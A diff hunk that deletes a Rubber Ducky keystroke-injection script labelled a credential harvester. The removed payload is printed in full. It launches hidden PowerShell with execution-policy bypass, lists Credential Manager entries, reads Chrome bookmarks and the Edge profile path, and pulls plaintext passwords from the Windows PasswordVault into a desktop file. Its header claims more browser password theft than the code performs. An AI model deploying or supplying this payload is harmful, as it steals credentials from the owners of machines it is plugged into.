@@ -1,9 +1,0 @@
-REM CYBERFLIPPER — Rubber Ducky Cred Harvester
-REM Dumps browser saved passwords using built-in Windows cmdlets
-REM Targets: Chrome, Edge, Firefox credential stores
-REM FOR AUTHORIZED PEN TESTING ONLY
-DELAY 500
-GUI r
-DELAY 300
-STRING powershell -NoP -W Hidden -Exec Bypass -C "$f=[Environment]::GetFolderPath('Desktop')+'\cred_harvest_'+$(hostname)+'.txt';'=== CREDENTIAL HARVEST ===' | Out-File $f;'Date: '+(Get-Date) | Out-File -Append $f;'--- CREDENTIAL MANAGER ---' | Out-File -Append $f;cmdkey /list | Out-File -Append $f;'--- CHROME DATA ---' | Out-File -Append $f;$cp=$env:LOCALAPPDATA+'\Google\Chrome\User Data\Default';if(Test-Path $cp){'Chrome profile found at: '+$cp | Out-File -Append $f;$bm=$cp+'\Bookmarks';if(Test-Path $bm){(Get-Content $bm | ConvertFrom-Json).roots.bookmark_bar.children | Select-Object name,url | Format-Table | Out-File -Append $f}};'--- EDGE DATA ---' | Out-File -Append $f;$ep=$env:LOCALAPPDATA+'\Microsoft\Edge\User Data\Default';if(Test-Path $ep){'Edge profile found at: '+$ep | Out-File -Append $f};'--- VAULT ---' | Out-File -Append $f;$v=[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];try{(new-object $v).RetrieveAll() | ForEach-Object {$_.RetrievePassword();$_ | Select-Object Resource,UserName,Password | Format-Table | Out-File -Append $f}}catch{'Vault access denied' | Out-File -Append $f};'=== END ===' | Out-File -Append $f"
-ENTER
